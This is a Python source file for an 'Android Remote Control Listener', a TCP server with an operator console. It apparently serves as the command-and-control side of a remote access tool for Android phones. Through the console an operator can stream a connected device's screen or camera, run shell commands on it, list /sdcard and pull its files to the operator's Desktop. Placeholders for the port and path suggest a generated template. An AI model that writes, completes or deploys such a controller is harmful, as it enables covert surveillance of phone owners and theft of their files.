#!/usr/bin/env python3
"""
Android Remote Control Listener
Receives connections and displays video
"""

import socket
import threading
import cv2
import numpy as np
import struct
import tkinter as tk
from PIL import Image, ImageTk
import queue
import time
import os
import sys
from datetime import datetime

# Configuration
SERVER_IP = "0.0.0.0"
SERVER_PORT = PORT_PLACEHOLDER

class VideoViewer:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(f"Android Stream - Port {SERVER_PORT}")
        self.root.geometry("800x600")
        
        # Create canvas
        self.canvas = tk.Canvas(self.root, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        # Image queue
        self.image_queue = queue.Queue()
        self.current_image = None
        self.running = True
        self.fps_counter = 0
        self.last_fps_time = time.time()
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = tk.Label(self.root, textvariable=self.status_var, 
                              bd=1, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.update()
    
    def on_close(self):
        self.running = False
        self.root.destroy()
    
    def update(self):
        try:
            while True:
                img = self.image_queue.get_nowait()
                self.current_image = img
                self.fps_counter += 1
                
                now = time.time()
                if now - self.last_fps_time >= 1:
                    self.status_var.set(f"Streaming - {self.fps_counter} fps")
                    self.fps_counter = 0
                    self.last_fps_time = now
        except queue.Empty:
            pass
        
        if self.current_image is not None and self.running:
            self.display_image(self.current_image)
        
        if self.running:
            self.root.after(50, self.update)
    
    def display_image(self, img):
        try:
            canvas_width = self.root.winfo_width()
            canvas_height = self.root.winfo_height() - 20
            
            if canvas_width > 1 and canvas_height > 1:
                img_resized = cv2.resize(img, (canvas_width, canvas_height))
                img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
                img_pil = Image.fromarray(img_rgb)
                img_tk = ImageTk.PhotoImage(img_pil)
                
                self.canvas.delete("all")
                self.canvas.create_image(
                    canvas_width//2, canvas_height//2,
                    anchor=tk.CENTER, image=img_tk
                )
                self.canvas.image = img_tk
        except Exception as e:
            print(f"Display error: {e}")
    
    def show_image(self, img):
        if self.running:
            self.image_queue.put(img)
    
    def run(self):
        self.root.mainloop()

class ClientHandler:
    def __init__(self, client_socket, address):
        self.socket = client_socket
        self.address = address
        self.running = True
        self.viewer = None
        self.streaming = False
        self.device_info = {}
        
        # Create log file on Desktop
        log_filename = f"device_{address[0]}_{int(time.time())}.log"
        self.log_file = open(f"{DESKTOP_PLACEHOLDER}/{log_filename}", "w")
    
    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_file.write(f"[{timestamp}] {message}\n")
        self.log_file.flush()
    
    def handle(self):
        print(f"\n\033[92m[+] New connection from {self.address}\033[0m")
        self.log(f"Connected from {self.address}")
        
        # Start command thread
        cmd_thread = threading.Thread(target=self.command_loop)
        cmd_thread.daemon = True
        cmd_thread.start()
        
        while self.running:
            try:
                if self.streaming:
                    self.receive_frame()
                else:
                    self.socket.settimeout(0.5)
                    try:
                        data = self.socket.recv(1024).decode().strip()
                        if data:
                            print(f"\n\033[93m[Device] {data}\033[0m")
                            self.log(f"Device: {data}")
                    except socket.timeout:
                        pass
            except Exception as e:
                if self.running:
                    print(f"\n\033[91m[!] Error: {e}\033[0m")
                break
        
        self.cleanup()
    
    def receive_frame(self):
        try:
            size_data = self.socket.recv(4)
            if len(size_data) < 4:
                return
            
            frame_size = struct.unpack('!I', size_data)[0]
            
            frame_data = b''
            remaining = frame_size
            while remaining > 0:
                chunk = self.socket.recv(min(4096, remaining))
                if not chunk:
                    break
                frame_data += chunk
                remaining -= len(chunk)
            
            if len(frame_data) == frame_size and self.viewer:
                nparr = np.frombuffer(frame_data, np.uint8)
                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                if img is not None:
                    self.viewer.show_image(img)
        except Exception as e:
            print(f"\n\033[91m[!] Frame error: {e}\033[0m")
            self.streaming = False
    
    def command_loop(self):
        while self.running:
            try:
                cmd = input(f"\n\033[92m{self.address[0]}>\033[0m ")
                
                if cmd == "":
                    continue
                elif cmd == "help":
                    self.show_help()
                elif cmd == "stream":
                    self.send("START_STREAM")
                    self.streaming = True
                    self.viewer = VideoViewer()
                    viewer_thread = threading.Thread(target=self.viewer.run)
                    viewer_thread.daemon = True
                    viewer_thread.start()
                    print(f"\033[92m[*] Streaming started\033[0m")
                elif cmd == "stop":
                    self.send("STOP_STREAM")
                    self.streaming = False
                    if self.viewer:
                        self.viewer.running = False
                    print(f"\033[92m[*] Streaming stopped\033[0m")
                elif cmd.startswith("shell "):
                    self.send(f"SHELL:{cmd[6:]}")
                elif cmd.startswith("get "):
                    filename = cmd[4:]
                    self.send(f"GET:{filename}")
                    self.receive_file(filename)
                elif cmd == "ls":
                    self.send("LIST:/sdcard")
                elif cmd == "info":
                    self.send("INFO")
                elif cmd == "ping":
                    self.send("PING")
                elif cmd == "exit":
                    self.send("EXIT")
                    self.running = False
                    break
                else:
                    print(f"\033[91mUnknown command. Type 'help'\033[0m")
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception as e:
                print(f"\033[91mCommand error: {e}\033[0m")
                break
    
    def receive_file(self, filename):
        try:
            # Save to Desktop
            desktop_path = f"{DESKTOP_PLACEHOLDER}/{filename}"
            
            # Get file size
            size_data = self.socket.recv(8)
            if len(size_data) < 8:
                return
            file_size = struct.unpack('!Q', size_data)[0]
            
            print(f"\033[93m[*] Receiving {file_size} bytes...\033[0m")
            
            with open(desktop_path, 'wb') as f:
                remaining = file_size
                while remaining > 0:
                    chunk = self.socket.recv(min(8192, remaining))
                    if not chunk:
                        break
                    f.write(chunk)
                    remaining -= len(chunk)
                    
                    progress = ((file_size - remaining) / file_size) * 100
                    print(f"\rProgress: {progress:.1f}%", end="")
            
            print(f"\n\033[92m✓ File saved to Desktop: {filename}\033[0m")
            self.log(f"File received: {filename}")
            
        except Exception as e:
            print(f"\033[91mFile receive error: {e}\033[0m")
    
    def send(self, message):
        try:
            self.socket.send((message + "\n").encode())
        except:
            pass
    
    def show_help(self):
        print("""
\033[96m╔════════════════════════════════════════════╗
║           AVAILABLE COMMANDS              ║
╠════════════════════════════════════════════╣
║ stream     - Start video streaming        ║
║ stop       - Stop streaming                ║
║ shell <cmd>- Execute command               ║
║ get <file> - Download file to Desktop      ║
║ ls         - List files                    ║
║ info       - Device info                    ║
║ ping       - Test connection                ║
║ exit       - Disconnect                     ║
╚════════════════════════════════════════════╝\033[0m
        """)
    
    def cleanup(self):
        self.running = False
        if self.viewer:
            self.viewer.running = False
        try:
            self.socket.close()
        except:
            pass
        self.log_file.close()
        print(f"\n\033[91m[-] Disconnected from {self.address}\033[0m")

# Start server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((SERVER_IP, SERVER_PORT))
server.listen(5)
server.settimeout(1)

print(f"\n\033[92m")
print("╔══════════════════════════════════════════╗")
print("║     ANDROID REMOTE CONTROL LISTENER     ║")
print("╚══════════════════════════════════════════╝")
print(f"\033[0m")
print(f"Listening on port: {SERVER_PORT}")
print(f"Files will be saved to: {DESKTOP_PLACEHOLDER}")
print("Waiting for connections...\n")

try:
    while True:
        try:
            client, addr = server.accept()
            handler = ClientHandler(client, addr)
            threading.Thread(target=handler.handle).start()
        except socket.timeout:
            pass
except KeyboardInterrupt:
    print("\n\nServer stopped")
    server.close()
EOF

